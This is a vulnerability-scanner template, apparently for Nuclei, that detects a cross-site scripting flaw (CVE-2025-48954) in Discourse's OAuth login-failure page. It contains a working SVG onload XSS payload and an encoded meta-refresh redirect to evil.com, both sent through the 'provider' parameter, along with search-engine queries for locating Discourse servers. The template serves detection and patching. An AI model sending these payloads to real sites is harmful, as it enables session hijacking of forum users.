http:
- extractors:
  - group: 1
    name: discourse_version
    regex:
    - <meta name="generator" content="Discourse ([0-9]+\.[0-9]+\.[0-9]+(?:\.beta[0-9]+)?)
    - (?i)discourse['"]?\s*:\s*['"]?([0-9]+\.[0-9]+\.[0-9]+(?:\.beta[0-9]+)?)
    - (?i)x-discourse-version:\s*([0-9]+\.[0-9]+\.[0-9]+(?:\.beta[0-9]+)?)
    - '"version"\\s*:\\s*"([0-9]+\\.[0-9]+\\.[0-9]+(?:\\.beta[0-9]+)?)"'
    - <!-- Discourse ([0-9]+\.[0-9]+\.[0-9]+(?:\.beta[0-9]+)?)
    - /assets/discourse-([0-9]+\.[0-9]+\.[0-9]+(?:\.beta[0-9]+)?)
    - (?i)discourse[^"']*?([0-9]+\.[0-9]+\.[0-9]+(?:\.beta[0-9]+)?)
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(body, "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.com\">")
    - contains(to_lower(body), "discourse")
    - status_code == 200
    name: open-redirect-meta-refresh
    type: dsl
  - condition: and
    dsl:
    - contains(body, "onload=alert(")
    - contains(body, "XSS-CVE-2025-48954")
    - contains(to_lower(body), "discourse")
    - status_code == 200
    - '!contains(to_lower(header), "content-security-policy")'
    name: basic-xss-execution
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/auth/failure?provider={{redirect_payload}}'
  - '{{BaseURL}}/auth/failure?provider={{basic_xss}}'
id: CVE-2025-48954
info:
  author: ferreiraklet,DhiyaneshDK,pdresearch
  classification:
    cpe: cpe:2.3:a:discourse:discourse:*:*:*:*:*:*:*:*
    cve-id: CVE-2025-48954
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
    cvss-score: 8.1
    cwe-id: CWE-79
    epss-percentile: 0.93938
    epss-score: 0.13376
  description: 'Discourse versions prior to 3.5.0.beta6 contain a stored Cross-Site
    Scripting (XSS) vulnerability in the OAuth/social login functionality. The vulnerability
    is caused by lack of proper content security policy enforcement when processing
    social login failures,allowing remote attackers to inject and execute malicious
    scripts in users'' browsers.

    '
  impact: 'Attackers can inject malicious scripts through the provider parameter in
    OAuth login failures, executing JavaScript in victim browsers and potentially
    achieving session hijacking.

    '
  metadata:
    fofa-query: app="Discourse"
    hunter-query: web.title="Discourse"
    max-request: 5
    shodan-query: http.component:"Discourse"
    verified: true
    zoomeye-query: app:"Discourse"
  name: Discourse OAuth Social Login - Cross-site Scripting
  reference:
  - https://github.com/discourse/discourse/security/advisories/GHSA-26p5-mjjh-wfcf
  - https://nvd.nist.gov/vuln/detail/CVE-2025-48954
  remediation: Update the discourse to version 3.5.0.beta6 or later.
  severity: high
  tags: cve,cve2025,discourse,xss,oauth,vuln
variables:
  basic_xss: <svg/onload=alert('XSS-CVE-2025-48954')>
  redirect_payload: '%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttps%3A//evil.com%22%3E'
